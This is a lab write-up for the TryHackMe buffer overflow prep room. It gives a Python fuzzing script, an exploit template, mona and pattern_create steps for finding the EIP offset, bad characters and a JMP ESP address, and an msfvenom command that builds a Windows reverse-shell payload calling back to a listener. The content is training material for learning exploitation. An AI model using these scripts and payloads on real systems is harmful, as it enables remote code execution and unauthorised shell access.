# Buffer Overflow Guide 2

Working off the buffer overflow prep room: https://tryhackme.com/room/bufferoverflowprep

## Basic premise

Finding the offset of the EIP register when we overflow. We will overflow this with an instruction that will jump to the stack pointer (by finding other instances of JMP ESP in the code or referenced libraries, and then setting EIP to one of these addresses). At the stack pointer, past NOP padding, will be our payload code.

As part of this premise, we will work out which characters get malformed in the overwriting process, so called bad chars, and then ensure our payload and the address of the JMP ESP we try to find do not contain these characters.

## Fuzzing Script

python2

```python
import socket, time, sys

ip = "MACHINE_IP"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

## Exploit script

Python 2 again. Fill this in as you go, normally using payload with patterns and/or bad data tests.

```python
import socket

ip = "10.10.198.104"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

## General steps

Open target in immunity (with mona installed - see BUFFER-OVERFLOW-1.md for instructions), and set running.
For the first challenge, when run, to overflow you send OVERFLOW1 <string> after connecting.

1. Find the offset length. This can be done by fuzzing with longer and longer strings: the room does this with a script that connects and sends a increasing string, which gives the approx fail point (replicated above).

Once an idea is gained, generate the trace string: find pattern_create.rb from the metasploit framework (`find / -name pattern_create.rb 2>/dev/null`), and run it like so (using path from THM attackbox): `/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 2400` (assuming a fail length of somewhere around 2400). Generally take approx (say last from fuzz script) and add 400.

When this fails, in immunity, run `!mona findmsp -distance 2400` matching the length there. This will return the offset in the log ("EIP contains normal pattern : blah (offset <here>)")

2. Work out bad characters. Run `!mona bytearray -b "\x00"` to generate a big character string. This will create a bin file and a txt file, the text file containing a set of char options. Send this payload (resetting the exe in immunity), prefixed by the offset. E.g. if the payload is named buf, and the offset is 534, then send `"A" * 534 + buf`. 

Take the value out of the ESP register when it crashes, and then add to a mona command like so: `!mona compare -f c:\moda\oscp\bytearray.bin -a 0186FA30`, with the path to generated bin and the provided address in there. This will run and either return 'unmodified' in red, or a set of 'possibly bad characters'.

Repeat step 2, adding those bad characters to \x00 above, and do so until unmodified is returned.

> Bad characters affect the following bytes too. E.g., if you had a line like `Possibly bad chars: 01 02 03 04 07 08 2e 2f a0 a1`, its possible the bad characters are \x00, \x07, \x2e and \xa0, e.g. each character at the start of a run of sequential 'bad characters'.

3. Find a jump esp command. This can be done in mona passing in the found bad characters, e.g. `!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"` Pick an address from the list.

Once you have an address, reverse and hexify it. For example, 625011AF becomes \xAF\x11\x50\x62

4. Generate some shell code with msfvenom, passing in bad chars and the bind port: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.206.220 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f py`

5. Finally, deliver the payload like so:

offset from step 1, retn being step 3, payload from step 5. The padding is just to allow the unpacking of the msfcommand.

```
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
```
